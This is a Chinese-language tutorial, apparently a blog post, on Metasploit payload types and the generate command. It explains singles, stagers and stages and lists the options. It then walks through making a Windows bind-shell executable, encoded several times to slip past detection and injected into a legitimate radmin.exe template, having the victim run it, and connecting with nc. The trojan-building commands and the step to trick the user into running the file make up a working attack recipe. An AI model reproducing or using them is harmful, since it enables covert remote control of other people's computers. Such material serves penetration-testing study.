# 原创
：  【MSFconsole进阶】Payload（攻击载荷模块）：payload分类、相关命令、使用方法

# 【MSFconsole进阶】Payload（攻击载荷模块）：payload分类、相关命令、使用方法

**目录**

[一、简介：](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[1.1、payload（攻击载荷）：](#1.1%E3%80%81payload%EF%BC%88%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%EF%BC%89%EF%BC%9A)

[1.2、Shellcode：](#1.2%E3%80%81Shellcode%EF%BC%9A)

[二、payload分类](#%E4%BA%8C%E3%80%81payload%E5%88%86%E7%B1%BB)

[2.1、singles（独立载荷）](#2.1%E3%80%81singles%EF%BC%88%E7%8B%AC%E7%AB%8B%E8%BD%BD%E8%8D%B7%EF%BC%89)

[2.2、stagers（传输器载荷）](#2.2%E3%80%81stagers%EF%BC%88%E4%BC%A0%E8%BE%93%E5%99%A8%E8%BD%BD%E8%8D%B7%EF%BC%89)

[2.2.1、简介：](#2.2.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[2.2.2、特点：](#2.2.2%E3%80%81%E7%89%B9%E7%82%B9%EF%BC%9A)

[2.2.3、分类：](#2.2.3%E3%80%81%E5%88%86%E7%B1%BB%EF%BC%9A)

[2.3、stages（传输体载荷）](#2.3%E3%80%81stages%EF%BC%88%E4%BC%A0%E8%BE%93%E4%BD%93%E8%BD%BD%E8%8D%B7%EF%BC%89)

[2.3.1、简介：](#2.3.1%E3%80%81%E7%AE%80%E4%BB%8B%EF%BC%9A)

[2.3.2、示例：](#2.3.2%E3%80%81%E7%A4%BA%E4%BE%8B%EF%BC%9A)

[三、相关命令](#%E4%B8%89%E3%80%81%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4)

[四、使用方法：](#%E5%9B%9B%E3%80%81%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A)

[4.1、方法一：](#4.1%E3%80%81%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A)

[4.2、方法二：](#4.2%E3%80%81%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A)

[4.2.1、第一步：还是选择模块](#4.2.1%E3%80%81%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E8%BF%98%E6%98%AF%E9%80%89%E6%8B%A9%E6%A8%A1%E5%9D%97)

[4.2.2、第二步：直接使用payload](#4.2.2%E3%80%81%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8payload)

[4.2.3、第三步：考虑过滤坏字符](#4.2.3%E3%80%81%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E8%80%83%E8%99%91%E8%BF%87%E6%BB%A4%E5%9D%8F%E5%AD%97%E7%AC%A6)

[4.2.4、第四步：考虑多次加密、输出格式等](#4.2.4%E3%80%81%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E8%80%83%E8%99%91%E5%A4%9A%E6%AC%A1%E5%8A%A0%E5%AF%86%E3%80%81%E8%BE%93%E5%87%BA%E6%A0%BC%E5%BC%8F%E7%AD%89)

[4.2.5、第五步：诱使用户使用程序](#4.2.5%E3%80%81%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E8%AF%B1%E4%BD%BF%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8%E7%A8%8B%E5%BA%8F)

[4.2.6、第六步：连接目标端口](#4.2.6%E3%80%81%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E8%BF%9E%E6%8E%A5%E7%9B%AE%E6%A0%87%E7%AB%AF%E5%8F%A3)

---


## 一、简介：

> 
<h3>1.1、payload（攻击载荷）：</h3>
主要是用来建立目标机与攻击机稳定连接的，可返回shell，也可以进行程序注入等，payloads也被称为shellcode。
一般在exploit中调用payload
也可以使用 generate 命令直接生成payload
<hr/>
exploit是利用漏洞的一个过程和方法，最终的目的是为了执行payload（攻击代码）
<hr/>
<h3>1.2、Shellcode：</h3>
是一段代码（或填充数据），作为数据发送到目标服务器利用特定漏洞的代码，用于获取权限。


---


### 1.2、Shellcode：

---


---


## 二、payload分类

> 
<h3>2.1、singles（独立载荷）</h3>
可直接植入目标系统并执行相应的程序（payload：shell_bind_tcp）


> 
<h3>2.2、stagers（传输器载荷）</h3>
<h4>2.2.1、简介：</h4>
用于目标机与攻击机之间建立稳定的网络连接，与传输体载荷配合攻击。
<hr/>
<h4>2.2.2、特点：</h4>
为在漏洞利用后方便注入，载荷体积都非常小，且这类载荷功能都非常相似
<hr/>
<h4>2.2.3、分类：</h4>
bind型，需要攻击机主动连接目标端口
reverse型，目标机会反连接攻击机，提前设定好连接攻击机的ip地址和端口号


#### 2.2.2、特点：

---


> 
<h3>2.3、stages（传输体载荷）</h3>
<h4>2.3.1、简介：</h4>
stagers建立连接后，攻击机将stages传输给目标机，由stagers进行相应处理，将控制权转交给stages。
<hr/>
<h4>2.3.2、示例：</h4>
得到目标机的shell或meterpreter控制程序运行
攻击机可以在本端输入相应命令控制目标机。


#### 2.3.2、示例：

---


---


## 三、相关命令

> 
选项：
-E       
编码
<hr/>
-O &lt;opt&gt;  
弃用：“ -o”选项的别名
<hr/>
-P &lt;opt&gt;  
总所需有效载荷尺寸，自动生产适当的NOP雪橇长度
<hr/>
-S &lt;opt&gt;  
生成（大）Windows二进制文件时要使用的新部分名称
<hr/>
-b &lt;opt&gt;  
字符列表避免示例：'\ x00 \ xff'
<hr/>
-e &lt;opt&gt;  
用于使用的编码器
<hr/>
-f &lt;opt&gt;  
输出格式：base32,base64,bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,python-reflection,vba,vba-exe,vba-psh,vbs,war
<hr/>
-h        
显示此消息
<hr/>
-i &lt;opt&gt;  
编码有效载荷的次数
<hr/>
-k        
保留模板行为并将有效载荷注入新线程
<hr/>
-n &lt;opt&gt;  
在有效载荷上预先设置[长度]大小的点头
<hr/>
-o &lt;opt&gt;  
输出文件名（否则stdout）
<hr/>
 -p &lt;opt&gt;  
有效载荷的平台
<hr/>
-v        
详细输出
<hr/>
-x &lt;opt&gt;  
指定自定义可执行文件以用作模板


---


---


---


---


---


---


---


---


---


## 四、使用方法：

> 
<h3>4.1、方法一：</h3>
一般的使用方法
使用exploit时，用 use 去使用的payload（即set调用各种payload）


> 
<h3>4.2、方法二：</h3>
直接使用payload：直接用 use 使用一个payload
<hr/>
<h4>4.2.1、第一步：还是选择模块</h4>
#查看payload模块，也可以输入关键字然后会检索出来
use payload/
use payload/windows/shell_bind_tcp
show options 

LPORT：
监听端口，也就是目标开放的端口
RHOST：
目标机器只接受某个远程主机来连接它的4444端口（目标开放的端口），限制了来源IP（不设置的话，都可以连上去获取shell）
<hr/>
<h4>4.2.2、第二步：直接使用payload</h4>

使用 generate 命令来生成payload
输入generate
可以获得payload的一些基本信息和设置的参数，buf 就是 payload 的16进制表示方式

<hr/>
<h4>4.2.3、第三步：考虑过滤坏字符</h4>
产生的payload中可能存在“坏字符”
被执行过程中会被过滤掉、或被替代，导致无法产生预期结果
eg：
缓冲区溢出中，会把 “\x00”认为是一个坏字符，导致shellcode无法执行
<hr/>
生成payload时（默认不使用encoder）
比如过滤掉 “\x00” 就会从已有的encoder中选择最理想的一个
也可以手动指定encoder
#显示可用的encoders
show encoders
#使用指定的encoder
generate -e x86/add_sub


<hr/>
坏字符太多，就需要自己手动加上去
generate -b '\x00\xff'
利用 -b 参数，后面跟上要避免出现的坏字符（也就是过滤掉）
坏字符一般不止一个


<hr/>
过滤掉坏字符后的payload大小也变化了
“\x00”可能由1个字节变成2个甚至更多字节去表示

 <img alt="" height="127" src="https://img-blog.csdnimg.cn/1c8a1d188e2f42a7b026a9ffc09d536d.png" width="685"/>

<hr/>
<h4>4.2.4、第四步：考虑多次加密、输出格式等</h4>
**#研究一下输出格式之间代码是否有区别**
 #输出python使用的payload
generate -f python LHOST=192.168.190.131
LHOST是填自己的



#输出python使用的payload
generate -f c LHOST=192.168.190.131



对比可以发现，其实c语言格式输出的，和python格式输出的是存在不一样的


**#完整的一个输出exe文件**
generate -b '\x00\xff' -f exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -o /root/1.exe

打开目录位置 /root/1.exe


<hr/>

<h4>4.2.5、第五步：诱使用户使用程序</h4>
将exe文件拷贝/发送到目标主机上运行
<hr/>
<h4>4.2.6、第六步：连接目标端口</h4>
nc IP 端口号


---


#### 4.2.2、第二步：直接使用payload

---


---


#### 4.2.4、第四步：考虑多次加密、输出格式等

---


#### 4.2.6、第六步：连接目标端口
